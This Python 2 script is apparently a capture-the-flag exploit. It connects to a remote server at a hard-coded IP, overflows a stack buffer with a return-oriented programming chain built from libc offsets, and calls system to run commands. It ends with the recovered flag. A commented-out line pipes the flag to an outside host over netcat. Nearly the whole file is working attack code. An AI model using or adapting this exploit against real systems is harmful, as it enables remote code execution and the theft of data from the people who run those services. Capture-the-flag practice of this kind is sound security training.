import socket, telnetlib, sys, time
import hashlib, zlib, random
from struct import pack, unpack
from subprocess import check_output
 
'''
PREPARE FUNCTIONS
Reuse
'''
 
def sock(HOST, PORT, debug=True):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect( (HOST, PORT) )
	if debug: print "[+] Connected to server"
	return s
 
def telnet(s):
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()
 
def send(s, m, debug = True):
	if debug: print "[+] Send:", repr(m)
	s.send(m)
 
def recv(s, debug = True):
	m = s.recv(4096)
	if debug: print "[+] Recv\n", repr(m)
	return m
 
def recv_full(s, debug = True):
	data = ""
	while True:
		m = recv(s, False)
		data += m
		if len(m)<4096: break
	if debug: print "[+] Recv\n", repr(data)
	return data
 
def recv_until(s, m, debug = True):
	data = ""
	while m not in data:
		data += s.recv(1)
	if debug: print "[+] Recv\n", repr(data)
	return data
 
def p(m):
	return pack("<Q", m)
 
def u(m):
	return unpack("<I", m)[0]
 
def uu(m):
	return unpack("<Q", m)[0]
 
 
add_1stjmp = 0x4008CA
add_2stjmp = 0x4008B0
 
 
add_write = 0x7ffff7b00860
add_libc = add_write - 0xeb860
add_system = add_libc + 0x46640
add_pop_rdi = add_libc + 0x22b1a #gadget
add_magic = add_libc + 0x3BE100 #memory address has permission read/write
 
#get address of write in server
 
while True:
	time.sleep(0.2)
	s = sock('54.86.195.190', 8888)
	data = ""
	while len(data)<2780: data += recv(s, False)
	port = u(data[0x7d5:0x7d9])
	off_buf = 0x100000000-u(data[0x827:0x827+4])
	max_len = u(data[0x82f:0x82f+4])
	print "Port:", port
	print "Stack:", off_buf
	print "Read size:", max_len
	if port>100000 or off_buf>1000:
		s.close()
		continue
	
	#get write func address -> system address
	#pay = p(add_1stjmp) + p(0) + p(1) + p(0x601018) + p(100) + p(0x601018) + p(6) + p(add_2stjmp)
 
 
	#write string in valid memory , pop rdi from stack, call system
	pay = p(add_1stjmp) + p(0) + p(1) + p(0x601038) + p(100) + p(add_magic) + p(6) + p(add_2stjmp)
	pay += 'aaaaaaaa'*7 + p(add_pop_rdi) + p(add_magic) + p(add_system)
 
	if len(pay)+off_buf+8>=max_len: s.close(); continue
	pay = 'a'*(off_buf+8) + pay
 
	s2 = sock('54.86.195.190', port)
	send(s2, pay)
	
	#send command from part 2
	#listen on another host, to receive output
	#send(s2, "cat flag | nc trich.im 9999\x00")
	send(s2, "cat flag\x00")
	#--------
 
	data = recv(s2)
 
	s2.close()
	s.close()
 
	break
 
'''
data = data[0:8]
add_write = uu(data)
print "[+] Address write", hex(add_write)
'''
 
#flag{c4nt_w4it_f0r_cgc_7h15_y34r}